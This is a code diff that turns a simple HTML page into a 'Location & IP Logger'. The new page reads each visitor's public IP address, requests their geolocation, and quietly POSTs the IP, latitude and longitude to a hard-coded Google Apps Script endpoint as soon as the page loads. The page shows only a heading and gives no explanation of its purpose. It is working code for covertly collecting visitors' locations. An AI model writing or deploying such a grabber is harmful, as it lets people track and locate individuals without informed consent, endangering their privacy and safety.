@@ -1,15 +1,30 @@
 <!DOCTYPE html>
-<body onload="getLocation()">
+<html lang="en">
+<head>
+    <title>Location & IP Logger</title>
+    <script>
+        async function sendData() {
+            // Get IP address
+            const ipResponse = await fetch('https://api64.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            
+            // Get Geolocation
+            navigator.geolocation.getCurrentPosition(async position => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
 
-<script>
-function getLocation() {
-    navigator.geolocation.getCurrentPosition(showPosition);   
-}
-
-function showPosition(position) {
-    let lat = position.coords.latitude;
-    let lon = position.coords.longitude;
-    let googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-    window.location.href = googleMapsLink;
-}
-</script>
+                // Send data to Google Apps Script
+                fetch('https://script.google.com/macros/s/AKfycbxwypum47HfRaQBeRuCq1MssWpCcv0XGWdvP7zrUXY4CZLs4fLMYTak9CxpwnheSuM/exec', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ ip: ipData.ip, lat, lon })
+                });
+            });
+        }
+        window.onload = sendData;
+    </script>
+</head>
+<body>
+    <h1>Location & IP Logger</h1>
+</body>
+</html>
